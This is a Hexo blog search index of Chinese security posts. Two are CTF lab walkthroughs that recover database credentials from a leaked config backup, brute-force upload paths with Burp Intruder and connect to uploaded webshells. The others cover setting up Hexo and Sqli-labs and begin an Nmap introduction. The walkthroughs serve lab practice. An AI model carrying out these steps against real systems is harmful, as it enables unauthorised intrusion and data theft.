<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTF文件上传下载系统靶场</title>
    <url>/2023/08/29/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>1、进入目标网页<a class="link"   href="http://192.168.2.197:27689/" >http://192.168.2.197:27689/<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829150931766.png"
                      alt="image-20230829150931766"
                ></p>
<p>2、打开御剑对该网页端口进行域名扫描，发现web.config.bak可以下载该配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829151817977.png"
                      alt="image-20230829151817977"
                ></p>
<p>3、查看该配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829151903568.png"
                      alt="image-20230829151903568"
                ></p>
<p>4、打开Beekeeper Studio连接数据库</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829152054688.png"
                      alt="image-20230829152054688"
                ></p>
<p>5、在数据库中查找到该后台的登录账户和密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829152146923.png"
                      alt="image-20230829152146923"
                ></p>
<p>6、登录该系统</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829152210765.png"
                      alt="image-20230829152210765"
                ></p>
<p>7、拿到key1</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829152406330.png"
                      alt="image-20230829152406330"
                ></p>
<p>8、进入下载目录下的管理文件上传，看到aspx木马文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829153446236.png"
                      alt="image-20230829153446236"
                ></p>
<p>9、打开蚁剑对木马进行连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829153513417.png"
                      alt="image-20230829153513417"
                ></p>
<p>10、在D盘目录下的Web根目录找到key2，完成！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E9%9D%B6%E5%9C%BA/image-20230829153625337.png"
                      alt="image-20230829153625337"
                ></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF文件上传路径靶场</title>
    <url>/2023/08/28/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>1、进入目标网页<a class="link"   href="http://192.168.2.62/upload-lab/" >http://192.168.2.62/upload-lab/<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181018214.png"
                      alt="image-20230828181018214"
                ></p>
<p>2、上传木马文件hgd.php</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181114703.png"
                      alt="image-20230828181114703"
                ></p>
<p>3、找不到文件上传路径，打开Burpsuite进行抓包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181304612.png"
                      alt="image-20230828181304612"
                ></p>
<p>4、观察题目给出的路径提示，可知该文件类型为MD5编码(用户名)(随机数).php</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181540135.png"
                      alt="image-20230828181540135"
                ></p>
<p>5、Burpsuite发送到Intruder，添加payload变量</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181736472.png"
                      alt="image-20230828181736472"
                ></p>
<p>6、用python脚本生成hgd1-hgd99的文件粘贴至Payload设置</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181854243.png"
                      alt="image-20230828181854243"
                ></p>
<p>7、Payload处理设置为Hash的MD5编码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828181926227.png"
                      alt="image-20230828181926227"
                ></p>
<p>8、开始攻击，排列结果如下，200状态码说明该路径正确(这里有两个，有一个是因为我之前做的)</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828182010175.png"
                      alt="image-20230828182010175"
                ></p>
<p>9、复制该url，打开蚁剑尝试连接，一句话木马的密码为123，可以看到连接成功了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828182158390.png"
                      alt="image-20230828182158390"
                ></p>
<p>10、添加数据，寻找flag，flag就在phpstudy_pro目录下，成功！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828182251882.png"
                      alt="image-20230828182251882"
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/CTF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA/image-20230828182320290.png"
                      alt="image-20230828182320290"
                ></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传进阶</tag>
      </tags>
  </entry>
  <entry>
    <title>HEXO博客搭建</title>
    <url>/2023/07/26/HEXO%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="搭建HEXO博客"><a href="#搭建HEXO博客" class="headerlink" title="搭建HEXO博客"></a>搭建HEXO博客</h1><p>​                                                   </p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a><strong>下载</strong></h2><h4 id="1-提前安装好-node-js-https-nodejs-org-en-左边的那个"><a href="#1-提前安装好-node-js-https-nodejs-org-en-左边的那个" class="headerlink" title="1.提前安装好(node.js)[https://nodejs.org/en] 左边的那个"></a><strong>1.提前安装好(node.js)[<a class="link"   href="https://nodejs.org/en]" >https://nodejs.org/en]<i class="fas fa-external-link-alt"></i></a> 左边的那个</strong></h4><h4 id="2-提前安装好-GIt-https-git-scm-com-downloads"><a href="#2-提前安装好-GIt-https-git-scm-com-downloads" class="headerlink" title="2.提前安装好(GIt)[https://git-scm.com/downloads]"></a><strong>2.提前安装好(GIt)[<a class="link"   href="https://git-scm.com/downloads]" >https://git-scm.com/downloads]<i class="fas fa-external-link-alt"></i></a></strong></h4><h4 id="3-提前注册好一个github账号"><a href="#3-提前注册好一个github账号" class="headerlink" title="3.提前注册好一个github账号"></a><strong>3.提前注册好一个github账号</strong></h4><h4 id="4-如果文章图片没有显示，请自行挂代理"><a href="#4-如果文章图片没有显示，请自行挂代理" class="headerlink" title="4.如果文章图片没有显示，请自行挂代理"></a><strong>4.如果文章图片没有显示，请自行挂代理</strong></h4><p>​                                   </p>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a><strong>基本命令</strong></h2><h4 id="进入cmd-win-R-命令"><a href="#进入cmd-win-R-命令" class="headerlink" title="进入cmd (win+R)命令"></a>进入<code>cmd (win+R)</code>命令</h4><h4 id="hexo-g-生成编译好的博客文件"><a href="#hexo-g-生成编译好的博客文件" class="headerlink" title="hexo g 生成编译好的博客文件"></a><code>hexo g</code> 生成编译好的博客文件</h4><h4 id="hexo-clean-清理编译好的博客文件"><a href="#hexo-clean-清理编译好的博客文件" class="headerlink" title="hexo clean 清理编译好的博客文件"></a><code>hexo clean</code> 清理编译好的博客文件</h4><h4 id="hexo-s-启动博客服务"><a href="#hexo-s-启动博客服务" class="headerlink" title="hexo s 启动博客服务"></a><code>hexo s</code> 启动博客服务</h4><h4 id="hexo-deploy-发布博客"><a href="#hexo-deploy-发布博客" class="headerlink" title="hexo deploy 发布博客"></a><strong><code>hexo deploy</code> 发布博客</strong></h4><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>​                                                                                                                                                                                                 </p>
<h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a><strong>安装HEXO</strong></h2><h4 id="打开cmd-执行-npm-intall-hexo-g"><a href="#打开cmd-执行-npm-intall-hexo-g" class="headerlink" title="打开cmd,执行 npm intall hexo -g"></a><code>打开cmd,执行 npm intall hexo -g</code></h4><p>​                                             </p>
<h3 id="使用Git克隆"><a href="#使用Git克隆" class="headerlink" title="使用Git克隆"></a><strong>使用Git克隆</strong></h3><h4 id="git-clone-https-github-com-theme-keep-hexo-theme-keep-starter"><a href="#git-clone-https-github-com-theme-keep-hexo-theme-keep-starter" class="headerlink" title="git clone https://github.com/theme-keep/hexo-theme-keep-starter&lt;博客名&gt;"></a><code>git clone https://github.com/theme-keep/hexo-theme-keep-starter&lt;博客名&gt;</code></h4><p>​                                     </p>
<h2 id="进入文件夹"><a href="#进入文件夹" class="headerlink" title="进入文件夹"></a><strong>进入文件夹</strong></h2><h4 id="cd"><a href="#cd" class="headerlink" title="cd&lt;文件夹&gt;"></a><code>cd&lt;文件夹&gt;</code></h4><p>​                           </p>
<h2 id="如果下载速度太慢，可以使用淘宝源下载"><a href="#如果下载速度太慢，可以使用淘宝源下载" class="headerlink" title="如果下载速度太慢，可以使用淘宝源下载"></a><strong>如果下载速度太慢，可以使用淘宝源下载</strong></h2><h4 id="npm-config-set-registry-https-registry-npm-taobao-org"><a href="#npm-config-set-registry-https-registry-npm-taobao-org" class="headerlink" title="npm config set registry https://registry.npm.taobao.org/"></a><code>npm config set registry https://registry.npm.taobao.org/</code></h4><p>​                                               </p>
<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a><strong>安装依赖</strong></h2><h4 id="cd-hexo-theme-keep-starter"><a href="#cd-hexo-theme-keep-starter" class="headerlink" title="cd hexo-theme-keep-starter"></a><strong><code>cd hexo-theme-keep-starter</code></strong></h4><h4 id="npm-install-安装"><a href="#npm-install-安装" class="headerlink" title="npm install  (安装)"></a><strong><code>npm install</code>  (安装)</strong></h4><p>​                      </p>
<h2 id="启动Keep模板"><a href="#启动Keep模板" class="headerlink" title="启动Keep模板"></a><strong>启动Keep模板</strong></h2><h4 id="cd-hexo-theme-keep-starter-1"><a href="#cd-hexo-theme-keep-starter-1" class="headerlink" title="cd hexo-theme-keep-starter"></a><strong><code>cd hexo-theme-keep-starter</code></strong></h4><h4 id="npm-install-安装-1"><a href="#npm-install-安装-1" class="headerlink" title="npm install  (安装)"></a><strong><code>npm install</code>  (安装)</strong></h4><p>​                                                   </p>
<h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a><strong>运行项目</strong></h2><h4 id="npm-run-server（启动服务）"><a href="#npm-run-server（启动服务）" class="headerlink" title="npm run server（启动服务）"></a><strong><code>npm run server</code>（启动服务）</strong></h4><p>​                                                </p>
<h2 id="编译生成静态文件"><a href="#编译生成静态文件" class="headerlink" title="编译生成静态文件"></a><strong>编译生成静态文件</strong></h2><h4 id="npm-run-build"><a href="#npm-run-build" class="headerlink" title="npm run build"></a><strong><code>npm run build</code></strong></h4><p>​                                                            </p>
<h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a><strong>配置主题</strong></h2><h4 id="npm-run-deploy"><a href="#npm-run-deploy" class="headerlink" title="npm run deploy"></a><strong><code>npm run deploy</code></strong></h4><p>​                                                                        </p>
<h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a><strong>安装工具</strong></h2><h4 id="安装Typora或者VScode，建议使用Typora，插入图片更加方便。"><a href="#安装Typora或者VScode，建议使用Typora，插入图片更加方便。" class="headerlink" title="安装Typora或者VScode，建议使用Typora，插入图片更加方便。"></a><strong>安装Typora或者VScode，建议使用Typora，插入图片更加方便。</strong></h4><p>​                                                                                    </p>
<h2 id="配置图片"><a href="#配置图片" class="headerlink" title="配置图片"></a><strong>配置图片</strong></h2><h4 id="打开Typora，点击文件，进入偏好设置，点击图像-如下图所示"><a href="#打开Typora，点击文件，进入偏好设置，点击图像-如下图所示" class="headerlink" title="打开Typora，点击文件，进入偏好设置，点击图像 如下图所示"></a><strong>打开Typora，点击文件，进入偏好设置，点击图像 如下图所示</strong></h4><h4 id="设置路径为下"><a href="#设置路径为下" class="headerlink" title="设置路径为下"></a><strong>设置路径为下</strong></h4><h4 id="source-images-filename"><a href="#source-images-filename" class="headerlink" title="../../source/images/${filename}"></a><strong><code>../../source/images/$&#123;filename&#125;</code></strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/1.png"
                     
                ></p>
<p>​                                          </p>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a><strong>新建文章</strong></h2><h4 id="进入Source文件夹下，打开POST文件，找到-在文件上方开启cmd，执行hexo-new-post"><a href="#进入Source文件夹下，打开POST文件，找到-在文件上方开启cmd，执行hexo-new-post" class="headerlink" title="进入Source文件夹下，打开POST文件，找到&lt;博客名&gt;,在文件上方开启cmd，执行hexo new post&lt;文章标题&gt;"></a><strong>进入Source文件夹下，打开POST文件，找到&lt;博客名&gt;,在文件上方开启cmd，执行hexo new post&lt;文章标题&gt;</strong></h4><h4 id="即可开启文章"><a href="#即可开启文章" class="headerlink" title="即可开启文章"></a><strong>即可开启文章</strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/2.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/3.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/4.png"
                     
                ></p>
<h2 id="配置部署信息"><a href="#配置部署信息" class="headerlink" title="配置部署信息"></a><strong>配置部署信息</strong></h2><h5 id="进入博客文件夹，打开-config-yml-在最后一行输入："><a href="#进入博客文件夹，打开-config-yml-在最后一行输入：" class="headerlink" title="进入博客文件夹，打开 _config.yml , 在最后一行输入："></a><strong>进入博客文件夹，打开 _config.yml , 在最后一行输入：</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type:git</span><br><span class="line">repo: https://github.com/PumpkinBridge/PumpkinBridge.gihub.io</span><br><span class="line">#https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io                            </span><br><span class="line">branch:main</span><br></pre></td></tr></table></figure>



<hr>
<p><code>其中repo的内容上方提到过:git@github.com:&lt;GitHub用户名&gt;/&lt;个性名&gt;.github.io.git</code></p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a><strong>部署</strong></h2><h5 id="进入博客文件夹，打开-cmd-，依次执行："><a href="#进入博客文件夹，打开-cmd-，依次执行：" class="headerlink" title="进入博客文件夹，打开 cmd ，依次执行："></a><strong>进入博客文件夹，打开 <code>cmd</code> ，依次执行：</strong></h5><h5 id="生成编译文件：hexo-g"><a href="#生成编译文件：hexo-g" class="headerlink" title="生成编译文件：hexo g"></a><strong>生成编译文件：<code>hexo g</code></strong></h5><h5 id="发布博客：hexo-deploy"><a href="#发布博客：hexo-deploy" class="headerlink" title="发布博客：hexo deploy"></a><strong>发布博客：<code>hexo deploy</code></strong></h5><h5 id="执行完后等待1-2分钟，即可访问-https-github-io"><a href="#执行完后等待1-2分钟，即可访问-https-github-io" class="headerlink" title="执行完后等待1-2分钟，即可访问 https:&#x2F;&#x2F;&lt;个性名&gt;.github.io"></a><strong>执行完后等待1-2分钟，即可访问 https:&#x2F;&#x2F;&lt;个性名&gt;.github.io</strong></h5><h5 id="就可以进入到你的博客啦"><a href="#就可以进入到你的博客啦" class="headerlink" title="就可以进入到你的博客啦"></a><strong>就可以进入到你的博客啦</strong></h5>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-Labs环境搭建</title>
    <url>/2023/07/26/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Sqli-Labs环境搭建"><a href="#Sqli-Labs环境搭建" class="headerlink" title="Sqli-Labs环境搭建"></a>Sqli-Labs环境搭建</h1><h4 id="SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"><a href="#SQLI，sql-injection，我们称之为sql注入。何为sql，英文：Structured-Query-Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS-SQL-Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。" class="headerlink" title="SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。"></a><strong>SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。而Sqli-labs是一个印度程序员写的，用来学习sql注入的一个游戏教程。</strong></h4><p>​       </p>
<h2 id="SQLI-LAB下载地址："><a href="#SQLI-LAB下载地址：" class="headerlink" title="SQLI-LAB下载地址："></a>SQLI-LAB下载地址：</h2><p><a class="link"   href="https://github.com/Audi-1/sqli-labs" >https://github.com/Audi-1/sqli-labs<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="点击下载Download-ZIP"><a href="#点击下载Download-ZIP" class="headerlink" title="点击下载Download ZIP"></a><strong>点击下载Download ZIP</strong></h4><p> <img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.png"
                     
                >   </p>
<p>​               </p>
<h2 id="WEB环境搭建"><a href="#WEB环境搭建" class="headerlink" title="WEB环境搭建"></a><strong>WEB环境搭建</strong></h2><h4 id="在安装靶场之前，我们还需要搭建web运行环境："><a href="#在安装靶场之前，我们还需要搭建web运行环境：" class="headerlink" title="在安装靶场之前，我们还需要搭建web运行环境："></a>在安装靶场之前，我们还需要搭建web运行环境：</h4><h4 id="这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载"><a href="#这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载" class="headerlink" title="这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载"></a>这里直接使用phpstudy进行搭建，phpStudy是一个PHP调试环境的程序集成包。安装后一键启动即可运行web环境：Windows版phpstudy下载</h4><h4 id="下载后安装即可。"><a href="#下载后安装即可。" class="headerlink" title="下载后安装即可。"></a>下载后安装即可。</h4><p>​                      </p>
<h2 id="Sql-labs靶场环境搭建"><a href="#Sql-labs靶场环境搭建" class="headerlink" title="Sql-labs靶场环境搭建"></a><strong>Sql-labs靶场环境搭建</strong></h2><h4 id="安装好phpstudy后打开根目录"><a href="#安装好phpstudy后打开根目录" class="headerlink" title="安装好phpstudy后打开根目录"></a>安装好phpstudy后打开根目录</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png"
                     
                ></p>
<p>​                    </p>
<h4 id="把刚才下载的压缩包放到根目录下"><a href="#把刚才下载的压缩包放到根目录下" class="headerlink" title="把刚才下载的压缩包放到根目录下"></a>把刚才下载的压缩包放到根目录下</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"
                     
                ></p>
<p>​                         </p>
<h4 id="打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds-inc"><a href="#打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds-inc" class="headerlink" title="打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds.inc"></a>打开sqli-labs-master在里面中找到sqli-connections并以记事本的方式打开db-creds.inc</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png"
                     
                ></p>
<p>​              </p>
<h4 id="打开后将-dbpass-‘’改为-dbpass-‘root’并保存"><a href="#打开后将-dbpass-‘’改为-dbpass-‘root’并保存" class="headerlink" title="打开后将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’并保存"></a>打开后将$dbpass&#x3D;‘’改为$dbpass&#x3D;‘root’并保存</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/3.png"
                     
                ></p>
<p>​                     </p>
<h4 id="完成后打开phpstudy，启动Apache和Mysql"><a href="#完成后打开phpstudy，启动Apache和Mysql" class="headerlink" title="完成后打开phpstudy，启动Apache和Mysql"></a>完成后打开phpstudy，启动Apache和Mysql</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png"
                     
                ></p>
<p>​               </p>
<h4 id="接着浏览器打开“http-127-0-0-1-sqli-labs-master-”访问首页"><a href="#接着浏览器打开“http-127-0-0-1-sqli-labs-master-”访问首页" class="headerlink" title="接着浏览器打开“http://127.0.0.1/sqli-labs-master/”访问首页"></a>接着浏览器打开“<a class="link"   href="http://127.0.0.1/sqli-labs-master/%E2%80%9D%E8%AE%BF%E9%97%AE%E9%A6%96%E9%A1%B5" >http://127.0.0.1/sqli-labs-master/”访问首页<i class="fas fa-external-link-alt"></i></a></h4><h4 id="打开以后图示如下"><a href="#打开以后图示如下" class="headerlink" title="打开以后图示如下"></a>打开以后图示如下</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/5.png"
                     
                ></p>
<p>​           </p>
<h4 id="先点击Setup-reset-Database-for-labs使其自动创建数据库，创建表并填充数据后是这样的页面"><a href="#先点击Setup-reset-Database-for-labs使其自动创建数据库，创建表并填充数据后是这样的页面" class="headerlink" title="先点击Setup&#x2F;reset Database for labs使其自动创建数据库，创建表并填充数据后是这样的页面"></a>先点击Setup&#x2F;reset Database for labs使其自动创建数据库，创建表并填充数据后是这样的页面</h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/Sqli-Labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/6.png"
                     
                ></p>
<h4 id="到这里基本上就完成Sqli-Labs的搭建啦"><a href="#到这里基本上就完成Sqli-Labs的搭建啦" class="headerlink" title="到这里基本上就完成Sqli-Labs的搭建啦~"></a>到这里基本上就完成Sqli-Labs的搭建啦~</h4><h4 id="这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！"><a href="#这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！" class="headerlink" title="这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！"></a>这个靶场还是很不错的，对于需要练习Sql注入的小伙伴们，可以多多练习，祝各位大佬早日通关！！</h4><h4 id="谢谢观看"><a href="#谢谢观看" class="headerlink" title="谢谢观看~"></a>谢谢观看~</h4>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap搭建及使用</title>
    <url>/2023/07/28/Nmap%E6%90%AD%E5%BB%BA%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Nmap搭建及使用"><a href="#Nmap搭建及使用" class="headerlink" title="Nmap搭建及使用"></a>Nmap搭建及使用</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><h5 id="从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避-欺骗，Nmap是大大小小黑客行动的基本工具。"><a href="#从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避-欺骗，Nmap是大大小小黑客行动的基本工具。" class="headerlink" title="从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避&#x2F;欺骗，Nmap是大大小小黑客行动的基本工具。"></a><strong>从诞生之初，Nmap就一直是网络发现和攻击界面测绘的首选工具。从主机发现和端口扫描，到操作系统检测和IDS规避&#x2F;欺骗，Nmap是大大小小黑客行动的基本工具。</strong></h5><h5 id="为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。"><a href="#为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。" class="headerlink" title="为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。"></a><strong>为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。</strong></h5><p>​                </p>
